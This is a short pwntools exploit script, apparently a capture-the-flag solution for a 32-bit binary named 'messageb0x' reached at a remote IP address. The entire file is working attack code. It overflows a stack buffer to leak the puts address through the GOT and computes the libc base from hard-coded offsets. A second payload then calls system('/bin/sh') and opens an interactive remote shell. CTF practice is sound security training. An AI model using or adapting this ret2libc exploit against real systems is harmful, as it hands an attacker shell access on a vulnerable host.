from pwn import *

context.log_level = 'debug'

#p = process('./messageb0x')
p = remote('101.71.29.5',10000)

def stack_overflow(payload):
	p.recvuntil(' are:\n')
	p.sendline('1')
	p.recvuntil('address:\n')
	p.sendline('1')
	p.recvuntil('say:\n')
	p.sendline(payload)

elf = ELF('./messageb0x')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']


payload = 'a'*0x58 + 'bbbb' 
payload += p32(puts_plt) + p32(0x0804923B)
payload += p32(puts_got)
stack_overflow(payload)

p.recvuntil('you !\n')
puts_addr = u32(p.recv(4))
log.success('puts addr : 0x%x'%puts_addr)
# offset_puts = 0x0005fca0
# offset_system = 0x0003ada0
# offset_str_bin_sh = 0x15ba0b
offset_puts = 0x0005f140
offset_system = 0x0003a940
offset_str_bin_sh = 0x15902b
libc_base = puts_addr - offset_puts
log.success('libc addr : 0x%x'%libc_base)
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh

payload = 'a'*0x58 + 'bbbb'
payload += p32(system_addr) + p32(0xdeadbeef)
payload += p32(binsh_addr)
stack_overflow(payload)

p.interactive()